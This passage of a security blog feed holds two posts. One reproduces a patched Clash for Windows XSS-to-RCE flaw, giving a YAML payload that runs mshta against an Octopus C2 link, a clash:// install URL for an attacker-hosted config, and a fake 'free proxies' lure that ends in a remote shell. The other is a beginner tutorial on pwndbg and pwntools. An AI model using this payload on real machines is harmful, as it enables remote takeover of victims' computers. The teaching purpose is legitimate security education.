+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;8088&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxy-groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;-&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Principle: This is an XSS vulnerability. By inserting the payload into the Proxy&amp;rsquo;s name, arbitrary JS code execution is achieved. Here, it executes the command &lt;code&gt;mshta&lt;/code&gt; with the parameter being the Octopus-generated hta link.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Press &lt;code&gt;Esc&lt;/code&gt; and type &lt;code&gt;:wq&lt;/code&gt; to save and exit.&lt;/p&gt;
+&lt;p&gt;Afterward, the attacker can wait for the victim to connect ;)&lt;/p&gt;
+&lt;h3 id=&#34;victim-machine&#34;&gt;Victim Machine&lt;/h3&gt;
+&lt;p&gt;&lt;del&gt;(evil smirk)&lt;/del&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Simulating social engineering:&lt;/p&gt;
+&lt;p&gt;Hacker: &amp;ldquo;Do you want free proxies QAQ???&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Victim: &amp;ldquo;Yes, please.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Hacker: &amp;ldquo;Here&amp;rsquo;s what you need &lt;code&gt;clash://install-config?url=xxx&amp;amp;name=RCE&lt;/code&gt;&amp;rdquo;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;On any browser in Windows, enter&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;clash://install-config?url=http://Your_Linux_IP/RCE.yaml&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;name=YourName
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Tip: Remember to change the IP and name&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Then, in the pop-up, click &lt;code&gt;Open Clash For Windows&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/2.jpg&#34;
+	width=&#34;672&#34;
+	height=&#34;232&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Pop-up&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;289&#34;
+		data-flex-basis=&#34;695px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Go to the &lt;code&gt;Profiles&lt;/code&gt; page&lt;/p&gt;
+&lt;p&gt;Select &lt;code&gt;FileName.yaml&lt;/code&gt; (here it is &lt;code&gt;RCE.yaml&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/3.jpg&#34;
+	width=&#34;1695&#34;
+	height=&#34;852&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;RCE.yaml (It&amp;rsquo;s suggested to use a different name in real-world scenarios)&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;477px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Switch to the &lt;code&gt;Proxies&lt;/code&gt; page and click on the &lt;code&gt;a&lt;/code&gt; (this step is optional as this RCE is somewhat unstable)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/4.jpg&#34;
+	width=&#34;1594&#34;
+	height=&#34;751&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Well = =&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;509px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;successful-shell-acquisition&#34;&gt;Successful Shell Acquisition&lt;/h3&gt;
+&lt;p&gt;Octopus receives the shell, allowing you to &lt;strong&gt;do whatever you want&lt;/strong&gt; on the unfortunate Windows machine&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/sh.jpg&#34;
+	width=&#34;1239&#34;
+	height=&#34;667&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Watermelon shell&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;445px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;interact 1&lt;/code&gt; to execute any cmd command on that Windows machine. QWQ.&lt;/p&gt;
+&lt;h2 id=&#34;patch&#34;&gt;Patch&lt;/h2&gt;
+&lt;p&gt;The official Clash team has already released a new version fixing the vulnerability&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.10/Clash.for.Windows-0.19.10-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Download Link&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Compiling and Installing - Apache HTTP Server Version 2.4&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/mhaskar/Octopus/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Part of translations by &lt;strong&gt;GPT-4&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>PWN! PWN! PANG! Part2 --- Tool Usage</title>
+        <link>https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/</link>
+        <pubDate>Sat, 29 Jan 2022 21:35:29 -0500</pubDate>
+        
+        <guid>https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part2 --- Tool Usage" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part2&#34;&gt;PWN! PWN! PANG! Part2&lt;/h1&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;After covering the basics &lt;del&gt;(which don&amp;rsquo;t seem very basic)&lt;/del&gt;, let&amp;rsquo;s talk about tools today&lt;/p&gt;
+&lt;p&gt;Since we are studying PWN under Linux, &lt;strong&gt;please perform the following operations under Linux&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;What if you only have Windows?&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Option 1: Use &lt;a class=&#34;link&#34; href=&#34;https://customerconnect.vmware.com/cn/downloads/info/slug/desktop_end_user_computing/vmware_workstation_pro/16_0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;VMware Workstation Pro&lt;/a&gt; to install a Linux virtual machine (This is what I did)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Small Tip: Some Linux distributions (like Kali) can be downloaded as ready-made virtual machine files from their official websites. If you haven&amp;rsquo;t installed a VM before &lt;del&gt;(or are too lazy to)&lt;/del&gt;, this method is worth trying&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Option 2: Use &lt;a class=&#34;link&#34; href=&#34;https://os.51cto.com/article/649463.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;WSL2&lt;/a&gt; (Well, WSL2 is small in size and now comes with a GUI, but it&amp;rsquo;s not very comfortable to use compared with VMs)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;pwndbg&#34;&gt;PWNDBG&lt;/h2&gt;
+&lt;p&gt;pwndbg is a plugin for Linux GDB specifically designed for PWN, which helps us debug programs&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/1.png&#34;
+	width=&#34;1164&#34;
+	height=&#34;712&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/1_huda1e99c4adc499292a3b87cae3a80bac_745836_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/1_huda1e99c4adc499292a3b87cae3a80bac_745836_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;pwndbg&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;392px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;installation&#34;&gt;Installation&lt;/h3&gt;
+&lt;p&gt;Most Linux systems come with gdb pre-installed, but let&amp;rsquo;s just go over the installation process&lt;/p&gt;
+&lt;p&gt;Debian-based systems&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install gdb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;yum-based systems      &lt;del&gt;Just switch to Debian  ;)&lt;/del&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo yum -y install centos-release-scl
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo yum-config-manager --enable rhel-server-rhscl-7-rpms
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo yum -y install devtoolset-7
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; devtoolset-7 bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After installing gdb, we can install pwndbg&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/pwndbg/pwndbg.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; pwndbg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./setup.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;some-tips-related-to-installation&#34;&gt;Some Tips Related to Installation&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Note: Please do not delete or arbitrarily move the pwndbg directory, as it may cause pwndbg to not start properly&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;If pwndbg does not start properly after installation or a system update, please check the path&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vi ~/.gdbinit
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After executing the command, you should see a line&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; other_content/pwndbg/gdbinit.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Make sure to change the content after &lt;code&gt;source&lt;/code&gt; to the path of gdbinit.py in your pwndbg folder&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: If you wish to stop using pwndbg, simply remove this line&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;usage&#34;&gt;Usage&lt;/h3&gt;
+&lt;p&gt;Most of the usage is similar to gdb. Here are a few frequently used commands&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b function_name &lt;span class=&#34;c1&#34;&gt;# set a breakpoint at a function&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;b *address &lt;span class=&#34;c1&#34;&gt;# set a breakpoint at an address&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;r        &lt;span class=&#34;c1&#34;&gt;# run&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;n        &lt;span class=&#34;c1&#34;&gt;# execute the next instruction or skip a function&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s        &lt;span class=&#34;c1&#34;&gt;# step into a function&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;q        &lt;span class=&#34;c1&#34;&gt;# quit gdb&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As for the special features of pwndbg, &lt;strong&gt;they can be viewed using the &lt;code&gt;pwndbg&lt;/code&gt; command&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwndbg.png&#34;
+	width=&#34;1133&#34;
+	height=&#34;719&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/pwndbg_hu4a8fe27ede4dbc984c67bac06fa6cf6c_663694_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;pwndbg command&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;157&#34;
+		data-flex-basis=&#34;378px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;pwntools&#34;&gt;PWNTOOLS&lt;/h2&gt;
+&lt;p&gt;This is a third-party Python library for pwn&lt;/p&gt;
+&lt;h3 id=&#34;installation-1&#34;&gt;Installation&lt;/h3&gt;
+&lt;p&gt;You can install &lt;code&gt;pwntools&lt;/code&gt; simply using&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install pwntools
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Don&amp;rsquo;t have pip? Hurry up and install Python 3!!! (Most Linux systems should have it pre-installed = = )&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;usage-1&#34;&gt;Usage&lt;/h3&gt;
+&lt;p&gt;Use it just like any standard Python library&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let me mention a few commonly used commands, qaq (others will be discussed as needed). Of course, it&amp;rsquo;s best to check the &lt;a class=&#34;link&#34; href=&#34;https://docs.pwntools.com/en/stable/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;documentation&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./program_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Similar to &amp;#34;listening&amp;#34; to a local program with PWNTools, then use the &amp;#39;io&amp;#39; variable for data transmission&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# send data (no automatic newline at the end)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# send a line of data (automatically adds a newline at the end)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# receive data, similar to the above two functions&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Note: In the PWN process, it&amp;#39;s crucial to choose the above four commands based on the target program&amp;#39;s input/output functions, as these subtle differences could prevent you from getting a shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# switch to interactive mode, where we can &amp;#34;enjoy the acquired Shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pwnpwn-lets-get-hands-on-experiences&#34;&gt;PWN?PWN! Let&amp;rsquo;s Get Hands-On Experiences&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Task: Familiarize yourself with the use of pwntools&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s run and see what this little program is all about ;)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;PS: If the terminal indicates insufficient permissions, please give the program executable permissions&lt;/p&gt;
+&lt;p&gt;chmod +x tools&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/2.png&#34;
+	width=&#34;1146&#34;
+	height=&#34;712&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/2_hu8d8bc83acf62da5116ca7f65ad34848b_497539_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;The little program looks like this&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;160&#34;
+		data-flex-basis=&#34;386px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Output&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Pwntools is such an awesome python module, right?
